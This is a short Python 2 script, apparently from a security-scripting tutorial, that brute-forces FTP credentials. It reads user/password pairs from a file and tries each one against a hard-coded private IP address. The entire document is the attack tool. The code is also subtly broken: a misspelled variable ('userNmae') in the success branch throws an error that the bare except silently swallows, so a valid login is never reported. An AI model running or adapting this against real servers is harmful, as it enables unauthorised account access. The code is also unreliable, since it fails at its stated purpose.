import ftplib

def bruteLogin(hostname,passwdFile):
  pF = open(passwdFile, 'r')
  for line in pF.readlines():
    userName = line.split(':')[0]
    passWord = line.split(':')[1].strip('\r').strip('\n')
    print "[+] Trying: "+userName+"/"+passWord

    try:
      ftp = ftplib.FTP(hostname)
      ftp.login(userName,passWord)
      print '\n[*] '+str(hostname)+\
        ' FTP Logon Succeeded: '+userNmae+"/"+passWord
      ftp.quit()
      return (userName,passWord)
    except Exception, e:
      pass
  print '\n[-] Could not brute force FTP credentials.'
  return (None,None)

host = '192.168.1.254'
passwdFile = 'userpass.txt'

bruteLogin(host,passwdFile)

